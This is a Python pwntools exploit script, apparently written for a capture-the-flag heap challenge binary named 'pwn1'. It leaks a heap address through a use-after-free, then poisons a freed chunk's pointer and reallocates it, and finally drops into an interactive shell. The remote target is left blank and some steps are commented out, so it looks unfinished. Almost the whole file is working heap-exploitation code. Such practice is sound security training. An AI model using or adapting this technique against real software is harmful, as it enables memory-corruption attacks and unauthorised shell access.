from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn1")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x12fa)
    b *$rebase(0x1298)
''')

def add(size, content):
    sla(b'choice: ', b'1')
    sla(b'size: ', str(size).encode())
    sa(b'data: ', content)

def delete():
    sla(b'choice: ', b'2')

def show():
    sla(b'choice: ', b'3')

def edit(content):
    sla(b'choice: ', b'4')
    sa(b'NewData: ', content)

add(0x80, b'a')
delete()
show()
leak_addr = u64(ru(b'\x0a')[-6:-1].ljust(8, b'\x00')) << 12
pr('leak_addr', leak_addr)
edit(p64(leak_addr + 0x10) + b'a')
delete()
add(0x80, p64(leak_addr + 0x10))
#edit(p64(leak_addr + 0x10))
#add(0x40, b'\x00' * 0x10 + b'\x40' * 0x30)


shell()
